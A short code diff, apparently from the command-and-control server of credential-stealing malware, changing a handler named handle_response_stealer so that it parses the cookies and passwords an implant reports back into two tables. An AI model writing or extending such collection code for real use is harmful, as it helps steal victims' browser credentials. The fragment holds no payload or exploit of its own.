@@ -216,8 +216,7 @@ def handle_response_stealer():
         request.get_data()
         data = request.data
         data = json.loads(data)
-        username_list, password_list, url_list, host_key_list, encrypted_value_list = WyattWonderland.newParseJSON(
-            data)
+        cookie_table, password_table = WyattWonderland.newParseJSON(data)
         task_id = data['task_id']
         success = data['success']
         target_implant_id = data['target_implant_id']
